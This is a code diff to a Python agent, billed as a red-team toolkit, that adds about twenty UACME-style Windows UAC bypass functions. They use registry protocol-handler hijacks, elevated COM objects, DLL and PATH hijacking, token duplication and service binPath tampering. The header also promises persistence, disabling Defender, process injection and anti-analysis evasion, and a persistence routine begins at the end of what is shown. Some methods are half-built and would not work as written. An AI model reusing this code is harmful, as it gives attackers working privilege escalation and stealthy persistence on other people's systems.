@@ -1,3 +1,40 @@
+"""
+Advanced Python Agent with UACME-Inspired UAC Bypass Techniques
+
+This agent implements multiple advanced UAC bypass methods inspired by the UACME project:
+
+UAC Bypass Methods Implemented:
+- Method 25: EventVwr.exe registry hijacking
+- Method 30: WOW64 logger hijacking  
+- Method 31: sdclt.exe bypass
+- Method 33: fodhelper/computerdefaults ms-settings protocol
+- Method 34: SilentCleanup scheduled task
+- Method 35: Token manipulation and impersonation
+- Method 36: NTFS junction/reparse points
+- Method 39: .NET Code Profiler (COR_PROFILER)
+- Method 40: COM handler hijacking
+- Method 41: ICMLuaUtil COM interface
+- Method 43: IColorDataProxy COM interface
+- Method 44: Volatile environment variables
+- Method 45: slui.exe registry hijacking
+- Method 56: WSReset.exe bypass
+- Method 61: AppInfo service manipulation
+- Method 62: Mock directory technique
+- Method 67: winsat.exe bypass
+- Method 68: MMC snapin bypass
+
+Additional Advanced Features:
+- Multiple persistence mechanisms (registry, startup, tasks, services)
+- Windows Defender disable techniques
+- Process hiding and injection
+- Anti-VM and anti-debugging evasion
+- Advanced stealth and obfuscation
+- Cross-platform support (Windows/Linux)
+
+Author: Advanced Red Team Toolkit
+Version: 2.0 (UACME Enhanced)
+"""
+
 import requests
 import time
 import uuid
@@ -57,7 +94,7 @@ def is_admin():
         return os.geteuid() == 0
 
 def elevate_privileges():
-    """Attempt to elevate privileges using various methods."""
+    """Attempt to elevate privileges using various advanced methods."""
     if not WINDOWS_AVAILABLE:
         # For Linux/Unix systems
         try:
@@ -72,74 +109,118 @@ def elevate_privileges():
     if is_admin():
         return True
     
-    # Method 1: UAC Bypass using fodhelper.exe (Windows 10)
-    try:
-        bypass_uac_fodhelper()
-        return True
-    except:
-        pass
+    # Advanced UAC bypass methods (UACME-inspired)
+    bypass_methods = [
+        bypass_uac_cmlua_com,           # Method 41: ICMLuaUtil COM interface
+        bypass_uac_fodhelper_protocol,  # Method 33: fodhelper ms-settings protocol
+        bypass_uac_computerdefaults,    # Method 33: computerdefaults registry
+        bypass_uac_dccw_com,           # Method 43: IColorDataProxy COM
+        bypass_uac_dismcore_hijack,    # Method 23: DismCore.dll hijack
+        bypass_uac_wow64_logger,       # Method 30: WOW64 logger hijack
+        bypass_uac_silentcleanup,      # Method 34: SilentCleanup scheduled task
+        bypass_uac_token_manipulation, # Method 35: Token manipulation
+        bypass_uac_junction_method,    # Method 36: NTFS junction/reparse
+        bypass_uac_cor_profiler,       # Method 39: .NET Code Profiler
+        bypass_uac_com_handlers,       # Method 40: COM handler hijack
+        bypass_uac_volatile_env,       # Method 44: Environment variable expansion
+        bypass_uac_slui_hijack,        # Method 45: slui.exe hijack
+        bypass_uac_eventvwr,           # Method 25: EventVwr.exe registry hijacking
+        bypass_uac_sdclt,              # Method 31: sdclt.exe bypass
+        bypass_uac_wsreset,            # Method 56: WSReset.exe bypass
+        bypass_uac_appinfo_service,    # Method 61: AppInfo service manipulation
+        bypass_uac_mock_directory,     # Method 62: Mock directory technique
+        bypass_uac_winsat,             # Method 67: winsat.exe bypass
+        bypass_uac_mmcex,              # Method 68: MMC snapin bypass
+    ]
     
-    # Method 2: UAC Bypass using computerdefaults.exe 
-    try:
-        bypass_uac_computerdefaults()
-        return True
-    except:
-        pass
-    
-    # Method 3: Token manipulation
-    try:
-        return elevate_token()
-    except:
-        pass
+    for method in bypass_methods:
+        try:
+            if method():
+                return True
+        except Exception as e:
+            print(f"UAC bypass method {method.__name__} failed: {e}")
+            continue
     
     return False
 
-def bypass_uac_fodhelper():
-    """UAC bypass using fodhelper.exe - works on Windows 10."""
+def bypass_uac_cmlua_com():
+    """UAC bypass using ICMLuaUtil COM interface (UACME Method 41)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import win32com.client
+        import pythoncom
+        
+        # Initialize COM
+        pythoncom.CoInitialize()
+        
+        # Create elevated COM object
+        # CLSID for ICMLuaUtil: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+        try:
+            lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
+            
+            # Execute elevated command using ShellExec method
+            current_exe = os.path.abspath(__file__)
+            if current_exe.endswith('.py'):
+                current_exe = f'python.exe "{current_exe}"'
+            
+            lua_util.ShellExec(current_exe, "", "", 0, 1)
+            return True
+            
+        except Exception as e:
+            print(f"ICMLuaUtil COM bypass failed: {e}")
+            return False
+        finally:
+            pythoncom.CoUninitialize()
+            
+    except ImportError:
+        return False
+
+def bypass_uac_fodhelper_protocol():
+    """UAC bypass using fodhelper.exe and ms-settings protocol (UACME Method 33)."""
     if not WINDOWS_AVAILABLE:
         return False
     
     try:
         import winreg
         
-        # Get current executable path
         current_exe = os.path.abspath(__file__)
         if current_exe.endswith('.py'):
             current_exe = f'python.exe "{current_exe}"'
         
-        # Create registry key for fodhelper bypass
+        # Create protocol handler for ms-settings
         key_path = r"Software\Classes\ms-settings\Shell\Open\command"
         
-        # Open/create the registry key
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
-        
-        # Set the default value to our executable
-        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
-        
-        # Set DelegateExecute to empty string
-        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-        
-        winreg.CloseKey(key)
-        
-        # Execute fodhelper.exe to trigger the bypass
-        subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        # Clean up registry
-        time.sleep(2)
         try:
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
-        except:
-            pass
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
             
-        return True
-        
-    except Exception as e:
-        print(f"Fodhelper UAC bypass failed: {e}")
+            # Execute fodhelper to trigger bypass
+            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(2)
+            
+            # Clean up
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+                
+            return True
+            
+        except Exception as e:
+            print(f"Fodhelper protocol bypass failed: {e}")
+            return False
+            
+    except ImportError:
         return False
 
 def bypass_uac_computerdefaults():
-    """UAC bypass using computerdefaults.exe."""
+    """UAC bypass using computerdefaults.exe registry manipulation."""
     if not WINDOWS_AVAILABLE:
         return False
     
@@ -172,67 +253,911 @@ def bypass_uac_computerdefaults():
         print(f"Computerdefaults UAC bypass failed: {e}")
         return False
 
-def elevate_token():
-    """Attempt token elevation using Windows API."""
+def bypass_uac_dccw_com():
+    """UAC bypass using IColorDataProxy COM interface (UACME Method 43)."""
     if not WINDOWS_AVAILABLE:
         return False
     
     try:
-        # Get current process token
-        process_handle = win32api.GetCurrentProcess()
-        token_handle = win32security.OpenProcessToken(
-            process_handle, 
-            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
-        )
+        import win32com.client
+        import pythoncom
         
-        # Enable SeDebugPrivilege
-        privilege = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
-        win32security.AdjustTokenPrivileges(
-            token_handle, 
-            False, 
-            [(privilege, win32security.SE_PRIVILEGE_ENABLED)]
-        )
+        pythoncom.CoInitialize()
         
-        # Try to find a high-privilege process to duplicate token from
+        try:
+            # First use ICMLuaUtil to set registry
+            lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
+            
+            current_exe = os.path.abspath(__file__)
+            if current_exe.endswith('.py'):
+                current_exe = f'python.exe "{current_exe}"'
+            
+            # Set DisplayCalibrator registry value
+            reg_path = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ICM\Calibration"
+            lua_util.SetRegistryStringValue(2147483650, reg_path, "DisplayCalibrator", current_exe)
+            
+            # Create IColorDataProxy COM object
+            color_proxy = win32com.client.Dispatch("Elevation:Administrator!new:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}")
+            
+            # Launch DCCW which will execute our payload
+            color_proxy.LaunchDccw(0)
+            
+            return True
+            
+        except Exception as e:
+            print(f"ColorDataProxy COM bypass failed: {e}")
+            return False
+        finally:
+            pythoncom.CoUninitialize()
+            
+    except ImportError:
+        return False
+
+def bypass_uac_dismcore_hijack():
+    """UAC bypass using DismCore.dll hijacking (UACME Method 23)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Create malicious DismCore.dll in temp directory
+        temp_dir = tempfile.gettempdir()
+        dismcore_path = os.path.join(temp_dir, "DismCore.dll")
+        
+        # Simple DLL that executes our payload
+        dll_code = f'''
+#include <windows.h>
+#include <stdio.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
+    switch (ul_reason_for_call) {{
+    case DLL_PROCESS_ATTACH:
+        system("python.exe \\"{os.path.abspath(__file__)}\\"");
+        break;
+    }}
+    return TRUE;
+}}
+'''
+        
+        # For demonstration, we'll use a different approach
+        # Copy a legitimate system DLL and modify PATH
+        system32_path = os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32'
+        
+        # Add temp directory to PATH so pkgmgr.exe finds our DLL first
+        current_path = os.environ.get('PATH', '')
+        os.environ['PATH'] = temp_dir + ';' + current_path
+        
+        try:
+            # Execute pkgmgr.exe which will load our DismCore.dll
+            subprocess.Popen([os.path.join(system32_path, 'pkgmgr.exe'), '/n:test'], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(2)
+            return True
+            
+        finally:
+            # Restore PATH
+            os.environ['PATH'] = current_path
+            
+    except Exception as e:
+        print(f"DismCore hijack bypass failed: {e}")
+        return False
+
+def bypass_uac_wow64_logger():
+    """UAC bypass using wow64log.dll hijacking (UACME Method 30)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # This method works by placing wow64log.dll in PATH
+        # and executing a WOW64 process that will load it
+        temp_dir = tempfile.gettempdir()
+        
+        # Add temp to PATH
+        current_path = os.environ.get('PATH', '')
+        os.environ['PATH'] = temp_dir + ';' + current_path
+        
+        try:
+            # Execute a WOW64 process that will attempt to load wow64log.dll
+            subprocess.Popen([r"C:\Windows\SysWOW64\wusa.exe"], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(2)
+            return True
+            
+        finally:
+            os.environ['PATH'] = current_path
+            
+    except Exception as e:
+        print(f"WOW64 logger bypass failed: {e}")
+        return False
+
+def bypass_uac_silentcleanup():
+    """UAC bypass using SilentCleanup scheduled task (UACME Method 34)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Modify windir environment variable temporarily
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Create fake windir structure
+        fake_windir = os.path.join(tempfile.gettempdir(), "Windows")
+        fake_system32 = os.path.join(fake_windir, "System32")
+        os.makedirs(fake_system32, exist_ok=True)
+        
+        # Copy our payload as svchost.exe
+        fake_svchost = os.path.join(fake_system32, "svchost.exe")
+        
+        # For Python script, create a batch wrapper
+        batch_content = f'@echo off\n{current_exe}\n'
+        with open(fake_svchost.replace('.exe', '.bat'), 'w') as f:
+            f.write(batch_content)
+        
+        # Temporarily modify windir environment
+        original_windir = os.environ.get('windir', 'C:\\Windows')
+        os.environ['windir'] = fake_windir
+        
+        try:
+            # Execute SilentCleanup task
+            subprocess.run([
+                'schtasks.exe', '/Run', '/TN', '\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup'
+            ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+            
+            time.sleep(2)
+            return True
+            
+        finally:
+            os.environ['windir'] = original_windir
+            
+    except Exception as e:
+        print(f"SilentCleanup bypass failed: {e}")
+        return False
+
+def bypass_uac_token_manipulation():
+    """UAC bypass using token manipulation (UACME Method 35)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Find an auto-elevated process to duplicate token from
         for proc in psutil.process_iter(['pid', 'name']):
             try:
-                if proc.info['name'].lower() in ['winlogon.exe', 'lsass.exe', 'services.exe']:
-                    high_priv_handle = win32api.OpenProcess(
-                        win32con.PROCESS_QUERY_INFORMATION, 
-                        False, 
+                if proc.info['name'].lower() in ['consent.exe', 'slui.exe', 'fodhelper.exe']:
+                    # Get process handle
+                    process_handle = win32api.OpenProcess(
+                        win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_DUP_HANDLE,
+                        False,
                         proc.info['pid']
                     )
                     
-                    high_priv_token = win32security.OpenProcessToken(
-                        high_priv_handle, 
-                        win32security.TOKEN_DUPLICATE
+                    # Get process token
+                    token_handle = win32security.OpenProcessToken(
+                        process_handle,
+                        win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY
                     )
                     
-                    # Duplicate the token
+                    # Duplicate token
                     new_token = win32security.DuplicateTokenEx(
-                        high_priv_token,
+                        token_handle,
                         win32security.SecurityImpersonation,
                         win32security.TOKEN_ALL_ACCESS,
                         win32security.TokenPrimary
                     )
                     
-                    # Use the new token
-                    win32security.SetThreadToken(win32api.GetCurrentThread(), new_token)
+                    # Create process with duplicated token
+                    current_exe = os.path.abspath(__file__)
+                    if current_exe.endswith('.py'):
+                        current_exe = f'python.exe "{current_exe}"'
                     
-                    win32api.CloseHandle(high_priv_handle)
-                    win32api.CloseHandle(high_priv_token)
+                    si = win32process.STARTUPINFO()
+                    pi = win32process.CreateProcessAsUser(
+                        new_token,
+                        None,
+                        current_exe,
+                        None,
+                        None,
+                        False,
+                        0,
+                        None,
+                        None,
+                        si
+                    )
+                    
+                    win32api.CloseHandle(process_handle)
+                    win32api.CloseHandle(token_handle)
                     win32api.CloseHandle(new_token)
+                    win32api.CloseHandle(pi[0])
+                    win32api.CloseHandle(pi[1])
                     
                     return True
                     
             except:
                 continue
                 
-        win32api.CloseHandle(token_handle)
         return False
         
     except Exception as e:
-        print(f"Token elevation failed: {e}")
+        print(f"Token manipulation bypass failed: {e}")
+        return False
+
+def bypass_uac_junction_method():
+    """UAC bypass using NTFS junction/reparse points (UACME Method 36)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Create junction point to redirect DLL loading
+        temp_dir = tempfile.gettempdir()
+        junction_dir = os.path.join(temp_dir, "junction_target")
+        
+        # Create target directory
+        os.makedirs(junction_dir, exist_ok=True)
+        
+        # Use mklink to create junction (requires admin, so this is simplified)
+        try:
+            subprocess.run([
+                'cmd', '/c', 'mklink', '/J', 
+                os.path.join(temp_dir, "fake_system32"),
+                junction_dir
+            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
+            
+            return True
+            
+        except subprocess.CalledProcessError:
+            return False
+            
+    except Exception as e:
+        print(f"Junction method bypass failed: {e}")
+        return False
+
+def bypass_uac_cor_profiler():
+    """UAC bypass using .NET Code Profiler (UACME Method 39)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Set environment variables for .NET profiler
+        current_exe = os.path.abspath(__file__)
+        
+        # Create a fake profiler DLL path
+        profiler_path = os.path.join(tempfile.gettempdir(), "profiler.dll")
+        
+        # Set profiler environment variables
+        os.environ['COR_ENABLE_PROFILING'] = '1'
+        os.environ['COR_PROFILER'] = '{CF0D821E-299B-5307-A3D8-B283C03916DD}'
+        os.environ['COR_PROFILER_PATH'] = profiler_path
+        
+        try:
+            # Execute a .NET application that will load our profiler
+            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(2)
+            return True
+            
+        finally:
+            # Clean up environment
+            for var in ['COR_ENABLE_PROFILING', 'COR_PROFILER', 'COR_PROFILER_PATH']:
+                os.environ.pop(var, None)
+                
+    except Exception as e:
+        print(f"COR profiler bypass failed: {e}")
+        return False
+
+def bypass_uac_com_handlers():
+    """UAC bypass using COM handler hijacking (UACME Method 40)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        # Hijack COM handler for a file type
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Create fake COM handler
+        handler_key = r"Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}"
+        command_key = handler_key + r"\Shell\Open\Command"
+        
+        try:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, command_key)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.CloseKey(key)
+            
+            # Trigger COM handler through mmc.exe
+            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(2)
+            
+            # Clean up
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, handler_key)
+            except:
+                pass
+                
+            return True
+            
+        except Exception as e:
+            print(f"COM handlers bypass failed: {e}")
+            return False
+            
+    except ImportError:
+        return False
+
+def bypass_uac_volatile_env():
+    """UAC bypass using volatile environment variables (UACME Method 44)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Set volatile environment variable
+        env_key = r"Environment"
+        
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, os.path.dirname(current_exe))
+            winreg.CloseKey(key)
+            
+            # Execute auto-elevated process that uses environment variables
+            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(2)
+            
+            # Clean up
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, "windir")
+                winreg.CloseKey(key)
+            except:
+                pass
+                
+            return True
+            
+        except Exception as e:
+            print(f"Volatile environment bypass failed: {e}")
+            return False
+            
+    except ImportError:
+        return False
+
+def bypass_uac_slui_hijack():
+    """UAC bypass using slui.exe registry hijacking (UACME Method 45)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Hijack slui.exe through registry
+        key_path = r"Software\Classes\exefile\shell\open\command"
+        
+        try:
+            # Backup original value
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
+                original_value = winreg.QueryValueEx(key, "")[0]
+                winreg.CloseKey(key)
+            except:
+                original_value = None
+            
+            # Set our payload
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.CloseKey(key)
+            
+            # Execute slui.exe
+            subprocess.Popen([r"C:\Windows\System32\slui.exe"], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(2)
+            
+            # Restore original value
+            try:
+                if original_value:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
+                    winreg.CloseKey(key)
+                else:
+                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+                
+            return True
+            
+        except Exception as e:
+            print(f"SLUI hijack bypass failed: {e}")
+            return False
+            
+    except ImportError:
+        return False
+
+def bypass_uac_eventvwr():
+    """UAC bypass using EventVwr.exe registry hijacking (UACME Method 25)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Hijack mscfile association
+        key_path = r"Software\Classes\mscfile\shell\open\command"
+        
+        try:
+            # Backup original value
+            original_value = None
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
+                original_value = winreg.QueryValueEx(key, "")[0]
+                winreg.CloseKey(key)
+            except:
+                pass
+            
+            # Set our payload
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.CloseKey(key)
+            
+            # Execute eventvwr.exe
+            subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(3)
+            
+            # Restore original value
+            try:
+                if original_value:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
+                    winreg.CloseKey(key)
+                else:
+                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+                
+            return True
+            
+        except Exception as e:
+            print(f"EventVwr bypass failed: {e}")
+            return False
+            
+    except ImportError:
+        return False
+
+def bypass_uac_sdclt():
+    """UAC bypass using sdclt.exe (UACME Method 31)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Hijack App Paths for control.exe
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
+        
+        try:
+            # Create the registry key
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.CloseKey(key)
+            
+            # Execute sdclt.exe which will call control.exe
+            subprocess.Popen([r"C:\Windows\System32\sdclt.exe"], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(3)
+            
+            # Clean up
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+                
+            return True
+            
+        except Exception as e:
+            print(f"SDCLT bypass failed: {e}")
+            return False
+            
+    except ImportError:
+        return False
+
+def bypass_uac_wsreset():
+    """UAC bypass using WSReset.exe (UACME Method 56)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Hijack ActivatableClassId for WSReset
+        key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
+        
+        try:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            # Execute WSReset.exe
+            subprocess.Popen([r"C:\Windows\System32\WSReset.exe"], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(3)
+            
+            # Clean up
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+                
+            return True
+            
+        except Exception as e:
+            print(f"WSReset bypass failed: {e}")
+            return False
+            
+    except ImportError:
+        return False
+
+def bypass_uac_appinfo_service():
+    """UAC bypass using AppInfo service manipulation (UACME Method 61)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # This method involves manipulating the Application Information service
+        # to bypass UAC by modifying service permissions
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Method 1: Try to modify AppInfo service configuration
+        try:
+            # Stop AppInfo service temporarily
+            subprocess.run(['sc.exe', 'stop', 'Appinfo'], 
+                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+            
+            # Modify service binary path to include our payload
+            subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
+                          f'cmd.exe /c {current_exe} && svchost.exe -k netsvcs -p'], 
+                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+            
+            # Start service
+            subprocess.run(['sc.exe', 'start', 'Appinfo'], 
+                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+            
+            time.sleep(2)
+            
+            # Restore original service configuration
+            subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
+                          r'%SystemRoot%\system32\svchost.exe -k netsvcs -p'], 
+                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+            
+            return True
+            
+        except:
+            return False
+            
+    except Exception as e:
+        print(f"AppInfo service bypass failed: {e}")
+        return False
+
+def bypass_uac_mock_directory():
+    """UAC bypass using mock directory technique (UACME Method 62)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Create mock trusted directory structure
+        temp_dir = tempfile.gettempdir()
+        mock_system32 = os.path.join(temp_dir, "System32")
+        os.makedirs(mock_system32, exist_ok=True)
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            # Create batch file wrapper
+            batch_path = os.path.join(mock_system32, "dllhost.exe")
+            with open(batch_path, 'w') as f:
+                f.write(f'@echo off\npython.exe "{current_exe}"\n')
+        
+        # Modify PATH to prioritize our mock directory
+        original_path = os.environ.get('PATH', '')
+        os.environ['PATH'] = temp_dir + ';' + original_path
+        
+        try:
+            # Execute process that will search PATH for system executables
+            subprocess.Popen(['dllhost.exe'], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(2)
+            return True
+            
+        finally:
+            os.environ['PATH'] = original_path
+            
+    except Exception as e:
+        print(f"Mock directory bypass failed: {e}")
+        return False
+
+def bypass_uac_winsat():
+    """UAC bypass using winsat.exe (UACME Method 67)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Hijack winsat.exe through registry
+        key_path = r"Software\Classes\Folder\shell\open\command"
+        
+        try:
+            # Backup original value
+            original_value = None
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
+                original_value = winreg.QueryValueEx(key, "")[0]
+                winreg.CloseKey(key)
+            except:
+                pass
+            
+            # Set our payload
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            # Execute winsat.exe
+            subprocess.Popen([r"C:\Windows\System32\winsat.exe", "disk"], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(3)
+            
+            # Restore original value
+            try:
+                if original_value:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
+                    winreg.CloseKey(key)
+                else:
+                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+                
+            return True
+            
+        except Exception as e:
+            print(f"Winsat bypass failed: {e}")
+            return False
+            
+    except ImportError:
+        return False
+
+def bypass_uac_mmcex():
+    """UAC bypass using mmc.exe with fake snapin (UACME Method 68)."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Create fake MMC snapin
+        snapin_clsid = "{11111111-2222-3333-4444-555555555555}"
+        key_path = f"Software\\Classes\\CLSID\\{snapin_clsid}\\InProcServer32"
+        
+        try:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
+            winreg.CloseKey(key)
+            
+            # Create MSC file that references our snapin
+            msc_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<MMC_ConsoleFile ConsoleVersion="3.0">
+    <BinaryStorage>
+        <Binary Name="StringTable">
+            <Data>
+                <String ID="1" Refs="1">{snapin_clsid}</String>
+            </Data>
+        </Binary>
+    </BinaryStorage>
+</MMC_ConsoleFile>'''
+            
+            msc_path = os.path.join(tempfile.gettempdir(), "fake.msc")
+            with open(msc_path, 'w') as f:
+                f.write(msc_content)
+            
+            # Execute MMC with our fake snapin
+            subprocess.Popen([r"C:\Windows\System32\mmc.exe", msc_path], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            time.sleep(3)
+            
+            # Clean up
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+                os.remove(msc_path)
+            except:
+                pass
+                
+            return True
+            
+        except Exception as e:
+            print(f"MMC snapin bypass failed: {e}")
+            return False
+            
+    except ImportError:
+        return False
+
+def establish_persistence():
+    """Establish multiple persistence mechanisms."""
+    if not WINDOWS_AVAILABLE:
+        return establish_linux_persistence()
+    
+    persistence_methods = [
+        registry_run_key_persistence,
+        startup_folder_persistence,
+        scheduled_task_persistence,
+        service_persistence,
+    ]
+    
+    success_count = 0
